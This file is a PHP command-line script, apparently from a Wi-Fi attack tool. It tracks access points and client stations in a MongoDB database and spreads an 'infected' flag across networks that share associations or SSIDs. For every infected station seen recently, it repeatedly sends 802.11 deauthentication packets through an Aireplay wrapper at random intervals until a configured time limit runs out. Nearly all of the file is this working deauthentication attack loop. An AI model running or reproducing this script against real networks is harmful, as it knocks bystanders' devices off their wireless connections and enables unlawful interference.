#!/usr/bin/php
<?php

require_once 'lib/vendor/autoload.php';
require_once 'lib/Airodump.php';
require_once 'lib/Aireplay.php';
require_once 'lib/Db.php';
require_once 'lib/Debug.php';

// Load file based configuration
$config = json_decode(file_get_contents(__DIR__ . '/data/config.json'));

// Setup database connection and database
$mongoClient = new MongoDB\Client($config->db->url);
Db::setMongoClientAndDb($mongoClient, $config->db->name);

// Load DB based configuration
$dbConfig = Db::getConfig($config->config_revision);

$start = new DateTime();

Debug::log(Debug::LOG_INFO, 'Attack Start: ' . ($startString = $start->format('Y-m-d H:i:s.u')));

// This will only run for the duration of the configured limit
while (time() - strtotime($startString) < $dbConfig->attack->limit) {
	// Load DB based configuration
	$dbConfig = Db::getConfig($config->config_revision);

	// Set debug mode on debug manager from configuration
	Debug::setDebugMode(isset($dbConfig->debug) ? $dbConfig->debug : (bool) $config->debug);
	Debug::setPrintLevel((int) $dbConfig->attack->log_level);

	$infectedAPs = [];
	$infectedSSIDs = [];
	$infectedStations = [];

	foreach(Db::getKnownAccessPointsCollection()->find() as $ap)
	{
		if(isset($ap['infected']) && $ap['infected'])
		{
			$infectedAPs[] = $ap['bssid'];
			$infectedSSIDs[] = $ap['essid'];
			Debug::log(Debug::LOG_TRACE3, 'AP ' . $ap->bssid . ' is infected.');
		} else {
			Debug::log(Debug::LOG_TRACE3, 'AP ' . $ap->bssid . ' is not infected.');
		}
	}

	foreach (Db::getKnownStationsCollection()->find() as $station) {
		if (isset($station['infected']) && $station['infected']) {
			$infectedStations[] = $station['macAddress'];

			Debug::log(Debug::LOG_TRACE3, 'Station ' . $station['macAddress'] . ' is infected.');

			if (preg_match('/([a-fA-F0-9]{2}[:|\-]?){6}/', $station['bssid']) == 1
				&& !in_array($station['bssid'], $infectedAPs)) {

				Debug::log(Debug::LOG_INFO, 'Infecting AP ' . $station['bssid'] . ' by association to infected station ' . $station['macAddress']);

				Db::getKnownAccessPointsCollection()->updateOne(['bssid' => $station['bssid']], ['$set' => ['infected' => true]]);
			}
		} else {
			Debug::log(Debug::LOG_TRACE3, 'Station ' . $station['macAddress'] . ' is not infected.');

			if (preg_match('/([a-fA-F0-9]{2}[:|\-]?){6}/', $station['bssid']) == 1
				&& in_array($station['bssid'], $infectedAPs)) {

				Debug::log(Debug::LOG_INFO, 'Infecting station ' . $station['macAddress'] . ' by association to infected AP ' . $station['bssid']);

				Db::getKnownStationsCollection()->updateOne(['macAddress' => $station['macAddress']], ['$set' => ['infected' => true]]);
			}
		}
	}

	foreach(Db::getKnownAccessPointsCollection()->find() as $ap)
	{
		Debug::log(Debug::LOG_TRACE3, 'Searching for SSID cross-contamination for ' . $ap['essid']);
		if ((!isset($ap['infected']) || !$ap['infected'])
			&& in_array($ap['essid'], $infectedSSIDs)) {

			Debug::log(Debug::LOG_INFO, 'Infecting AP ' . $ap['bssid'] . ' by use of infected SSID ' . $ap['essid']);

			Db::getKnownAccessPointsCollection()->updateOne(['bssid' => $ap['bssid']], ['$set' => ['infected' => true]]);
		}
	}

	foreach (Db::getKnownStationsCollection()->find() as $station) {
		Debug::log(Debug::LOG_TRACE2, 'Processing station ' . $station['macAddress']);

		if (isset($station['infected']) && $station['infected']) {

			if (preg_match('/([a-fA-F0-9]{2}[:|\-]?){6}/', $station['bssid']) == 1) {

				if (time() - strtotime($station['lastRx']) < $dbConfig->attack->attack_inactivity_ceil) {
					if (!isset($station['attackInterval'])
						|| time() - strtotime($station['lastAttack'])
						> $station['attackInterval']) {

						Debug::log(Debug::LOG_INFO, 'Sending deauth packet to ' . $station['macAddress'] . ' associated to ' . $station['bssid']);

						Debug::log(Debug::LOG_DEBUG, Aireplay::sendDeauth($station['bssid'], $station['macAddress'], $config->adapter));

						$station['lastAttack'] = (new DateTime())->format('Y-m-d H:i:s.u');
						$station['attackInterval'] = rand($dbConfig->attack->intervalFloor, $dbConfig->attack->intervalCeiling);

						Debug::log(Debug::LOG_TRACE3, 'Updating station ' . $station['macAddress'] . ' in database');
						Db::getKnownStationsCollection()->updateOne(['macAddress' => $station['macAddress']], ['$set' => $station]);

						Debug::log(Debug::LOG_INFO, 'New attack interval for ' . $station['macAddress'] . ' - ' . $station['attackInterval'] . ' seconds');
					}
				}else{
					Debug::log(Debug::LOG_TRACE3, 'Station ' . $station['macAddress'] . ' not visible for more than ' . $dbConfig->attack->attack_inactivity_ceil . ' seconds');
				}
			} else {
				Debug::log(Debug::LOG_TRACE3, 'Station ' . $station['macAddress'] . ' not associated to AP');
			}
		} else {
			Debug::log(Debug::LOG_TRACE3, 'Station ' . $station['macAddress'] . ' not infected');
		}
	}

	Debug::log(Debug::LOG_TRACE2, "Sleeping for 1 second");
	sleep(1);
}
